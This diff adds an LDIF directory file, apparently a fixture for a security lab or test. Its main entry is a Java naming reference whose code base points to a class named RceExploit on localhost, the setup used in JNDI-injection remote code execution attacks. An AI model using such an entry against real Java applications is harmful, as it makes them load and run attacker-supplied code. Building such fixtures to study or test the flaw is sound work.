@@ -1,0 +1,24 @@
+dn: dc=jisc,dc=ac,dc=uk
+objectclass: top
+objectclass: domain
+objectclass: extensibleObject
+dc: jisc
+
+
+dn: ou=people,dc=jisc,dc=ac,dc=uk
+objectclass: top
+objectclass: organizationalUnit
+ou: people
+
+
+dn: uid=java-ref,ou=people,dc=jisc,dc=ac,dc=uk
+objectclass: top
+objectclass: javaContainer
+objectclass: javaObject
+objectclass: javaNamingReference
+javaCodeBase: http://localhost:8080/rce/RceExploit.class
+javaClassName: uk.ac.jisc.cybersec.rce.RceExploit
+javaFactory: uk.ac.jisc.cybersec.rce.RceExploit
+cn: Java Class
+sn: Class
+uid: java-ref
